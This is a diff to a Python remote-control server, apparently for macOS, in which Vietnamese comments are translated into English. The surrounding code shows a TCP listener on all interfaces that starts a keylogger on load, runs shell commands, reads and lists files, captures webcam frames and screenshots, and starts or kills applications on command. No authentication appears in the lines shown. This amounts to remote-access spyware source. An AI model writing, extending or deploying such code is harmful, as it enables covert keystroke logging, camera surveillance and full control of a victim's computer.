@@ -16,7 +16,7 @@ import psutil
 HOST = "0.0.0.0"
 PORT = 5001
 
-# --- BIẾN TOÀN CỤC ---
+# --- GLOBAL VARIABLES ---
 global_cap = None
 global_frame = None
 camera_lock = threading.Lock()
@@ -48,7 +48,7 @@ def start_keylogger():
 start_keylogger()
 
 # ==========================================
-# HÀM HỆ THỐNG & FILE
+# SYSTEM & FILE OPERATIONS
 # ==========================================
 def get_file_bytes(path):
     if os.path.exists(path) and os.path.isfile(path):
@@ -57,12 +57,11 @@ def get_file_bytes(path):
 
 def list_directory(path):
     try:
-        # Nếu path rỗng hoặc là ".", lấy thư mục làm việc hiện tại
+        # Default to current working directory if path is empty or "."
         if not path or path == ".": path = os.getcwd()
         
-        # --- THÊM DÒNG NÀY: Chuyển thành đường dẫn tuyệt đối ---
+        # Convert to absolute path
         path = os.path.abspath(path)
-        # -------------------------------------------------------
 
         if not os.path.exists(path): return {"error": "Path not found"}
         
@@ -78,8 +77,9 @@ def list_directory(path):
                     "size": size,
                     "path": full_path
                 })
-            except: pass # Bỏ qua file lỗi quyền truy cập
+            except: pass # Ignore permission errors
             
+        # Sort folders first, then files
         items.sort(key=lambda x: (x["type"] == "file", x["name"].lower()))
         return {"current_path": path, "items": items}
     except Exception as e: return {"error": str(e)}
@@ -92,17 +92,17 @@ def run_shell(cmd):
     except Exception as e: return str(e)
 
 # ==========================================
-# CÁC HÀM QUẢN LÝ APP (ĐÃ SỬA LỖI)
+# APPLICATION MANAGEMENT
 # ==========================================
 def scan_installed_apps():
     found_apps = {}
+    # Common macOS application directories
     app_dirs = ["/Applications", "/System/Applications", "/System/Applications/Utilities", os.path.expanduser("~/Applications")]
     for d in app_dirs:
         if not os.path.exists(d): continue
         try:
             for item in os.listdir(d):
                 if item.endswith(".app"):
-                    # Lấy tên file .app làm tên ứng dụng
                     app_name = os.path.splitext(item)[0]
                     found_apps[app_name.lower()] = app_name
         except: pass
@@ -111,7 +111,6 @@ def scan_installed_apps():
 APPS = scan_installed_apps()
 
 def is_app_running(app_name):
-    # Kiểm tra xem app có đang chạy không bằng lệnh pgrep -f "AppName"
     try:
         subprocess.check_output(["pgrep", "-f", app_name])
         return True
@@ -119,7 +118,6 @@ def is_app_running(app_name):
         return False
 
 def start_app(app_name):
-    # Dùng lệnh 'open -a' của macOS để mở app
     try:
         subprocess.run(["open", "-a", app_name], check=True)
         return f"[OK] Started {app_name}"
@@ -127,18 +125,18 @@ def start_app(app_name):
         return f"[ERROR] Failed to start {app_name}: {e}"
 
 def stop_app(app_name):
-    # CÁCH 1: Dùng AppleScript để thoát nhẹ nhàng (Khuyên dùng)
+    # Method 1: Graceful quit using AppleScript
     try:
         print(f"Attempting to quit {app_name} via osascript...")
         cmd = f'quit app "{app_name}"'
         subprocess.run(["osascript", "-e", cmd], check=False)
-        time.sleep(1) # Đợi 1s để app đóng
+        time.sleep(1) 
         
         if not is_app_running(app_name):
             return f"[OK] Stopped {app_name}"
     except: pass
 
-    # CÁCH 2: Nếu lì lợm, dùng pkill (Force Kill)
+    # Method 2: Force kill using pkill
     try:
         print(f"Force killing {app_name} via pkill...")
         subprocess.run(["pkill", "-f", app_name], check=False)
@@ -147,7 +145,7 @@ def stop_app(app_name):
         return f"[ERROR] Failed to stop {app_name}: {e}"
 
 # ==========================================
-# CÁC HÀM KHÁC (CAMERA, SCREENSHOT...)
+# MEDIA & UTILITIES
 # ==========================================
 def camera_loop():
     global global_cap, global_frame
@@ -193,7 +191,6 @@ def capture_full_quality_bytes():
     except: return None
 
 def take_screenshot():
-    # Lưu file trên server (nếu cần)
     try:
         os.makedirs("screenshots", exist_ok=True)
         filename = f"screenshots/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
@@ -261,7 +258,6 @@ def handle_client(conn, addr):
         # --- APP CONTROL ---
         elif command in ("start", "stop"):
              if len(parts) >= 2:
-                 # Ghép lại tên app (vì có thể có khoảng trắng)
                  key = " ".join(parts[1:]).lower()
                  name = APPS.get(key, " ".join(parts[1:]))
                  
